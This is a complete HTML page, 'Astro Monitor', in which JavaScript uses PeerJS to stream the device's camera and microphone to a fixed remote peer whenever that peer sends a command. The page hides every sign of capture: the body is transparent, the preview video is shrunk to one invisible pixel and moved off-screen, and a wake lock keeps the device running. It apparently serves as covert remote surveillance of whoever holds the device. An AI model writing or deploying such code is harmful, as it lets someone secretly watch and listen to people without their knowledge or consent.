<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Monitor - Remote Controlled Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localPreview" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        // Hardcoded camera IDs from your debug tool
        const FRONT_CAMERA_ID = "10b9b4560c08ab4ec010cccb8ca88678";
        const BACK_CAMERA_ID = "981ef5a661d52d5e17699148be2829d3";
        
        let peer = null;
        let dataConn = null;
        let currentCall = null;
        let currentStream = null;
        let currentMode = "video"; // 'video' or 'audio'
        let currentCamera = "front";
        let wakeLock = null;
        
        function log(msg) {
            console.log(`[MONITOR] ${msg}`);
        }
        
        async function getAudioOnlyStream() {
            log(`Getting audio-only stream...`);
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: false
                });
                log(`✅ Audio-only stream ready`);
                return stream;
            } catch (err) {
                log(`Audio failed: ${err.message}`);
                throw err;
            }
        }
        
        async function getVideoStream(camera) {
            const isBack = (camera === 'back');
            const targetDeviceId = isBack ? BACK_CAMERA_ID : FRONT_CAMERA_ID;
            
            log(`Getting ${camera} camera video stream...`);
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: {
                        deviceId: { exact: targetDeviceId },
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                log(`✅ ${camera} camera acquired - facingMode: ${settings.facingMode}`);
                return stream;
                
            } catch (err) {
                log(`Camera failed: ${err.message}`);
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: true,
                        video: {
                            facingMode: isBack ? "environment" : "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                    log(`✅ ${camera} camera via facingMode`);
                    return stream;
                } catch (e) {
                    log(`Camera fallback failed: ${e.message}`);
                    throw e;
                }
            }
        }
        
        async function startStream(mode, camera = currentCamera) {
            log(`🎥 Starting ${mode} mode...`);
            
            // Close existing call
            if (currentCall) {
                log('Closing existing call');
                currentCall.close();
                currentCall = null;
            }
            
            // Stop existing stream
            if (currentStream) {
                currentStream.getTracks().forEach(t => t.stop());
                currentStream = null;
            }
            
            try {
                let stream;
                if (mode === 'audio') {
                    stream = await getAudioOnlyStream();
                } else {
                    stream = await getVideoStream(camera);
                }
                
                currentStream = stream;
                currentMode = mode;
                currentCamera = camera;
                
                // Local preview (hidden)
                document.getElementById('localPreview').srcObject = stream;
                
                log(`Calling ${PARTNER_ID} with ${mode} mode...`);
                
                // Create new call
                currentCall = peer.call(PARTNER_ID, stream, {
                    metadata: { mode: mode, camera: camera, type: 'live' }
                });
                
                currentCall.on('open', () => {
                    log(`✅ Call opened for ${mode} mode`);
                });
                
                currentCall.on('close', () => {
                    log(`Call closed`);
                    currentCall = null;
                });
                
                currentCall.on('error', (err) => {
                    log(`❌ Call error: ${err}`);
                });
                
            } catch (err) {
                log(`❌ Failed to start stream: ${err.message}`);
            }
        }
        
        function stopAllStreams() {
            log(`🛑 Stopping all streams...`);
            
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
            
            if (currentStream) {
                currentStream.getTracks().forEach(t => t.stop());
                currentStream = null;
            }
            
            currentMode = null;
            log(`✅ All streams stopped`);
        }
        
        function handleDataMessage(data) {
            log(`Received command: ${data.type}`);
            
            if (data.type === 'start_video') {
                const targetCamera = data.camera || 'front';
                log(`📷 Starting VIDEO mode with ${targetCamera} camera`);
                startStream('video', targetCamera);
                
            } else if (data.type === 'start_audio') {
                log(`🎙️ Starting AUDIO mode`);
                startStream('audio');
                
            } else if (data.type === 'stop_all') {
                log(`🛑 Stop command received`);
                stopAllStreams();
                
            } else if (data.type === 'switch_camera') {
                if (currentMode === 'video') {
                    const targetCamera = data.camera;
                    log(`📷 Switching to ${targetCamera} camera`);
                    startStream('video', targetCamera);
                }
            }
        }
        
        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing monitor as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', async () => {
                log(`✅ Monitor ACTIVE - ID: ${MY_ID}`);
                log(`Ready for connection from ${PARTNER_ID}`);
            });
            
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    log(`📡 Remote connected`);
                    dataConn = conn;
                    conn.on('data', handleDataMessage);
                    conn.on('close', () => {
                        log('Remote disconnected');
                        stopAllStreams();
                        dataConn = null;
                    });
                } else {
                    conn.close();
                }
            });
            
            peer.on('error', (err) => {
                log(`Error: ${err.type}`);
                if (err.type === 'unavailable-id') {
                    setTimeout(() => initPeer(), 5000);
                }
            });
        }
        
        log('╔════════════════════════════════╗');
        log('║   ASTRO MONITOR               ║');
        log('║   Remote Controlled           ║');
        log('╚════════════════════════════════╝');
        
        preventScreenLock();
        initPeer();
        
        window.addEventListener('beforeunload', () => {
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (currentStream) {
                currentStream.getTracks().forEach(t => t.stop());
            }
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
